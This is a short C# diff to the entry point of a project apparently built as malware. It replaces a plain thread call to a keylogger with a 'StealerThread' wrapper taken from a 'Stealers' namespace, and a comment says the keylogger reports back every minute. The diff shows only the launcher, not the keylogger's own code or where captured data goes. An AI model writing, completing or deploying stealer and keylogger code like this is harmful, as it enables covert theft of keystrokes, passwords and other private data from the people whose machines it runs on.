@@ -1,15 +1,13 @@
-﻿using System;
-using System.Collections.Generic;
-using System.Text;
-using System.Threading;
+﻿using sub.Stealers;
 
 namespace sub
 {
     class Program
     {
-        static void Main(string[] args)
+        static void Main()
         {
-            new Thread(Keylogger.Run).Start(10);
+            StealerThread logger = new StealerThread(new Keylogger());    
+            logger.Start(1); //Starts a Keylogger that returns every 1 minute
         }
     }
 }
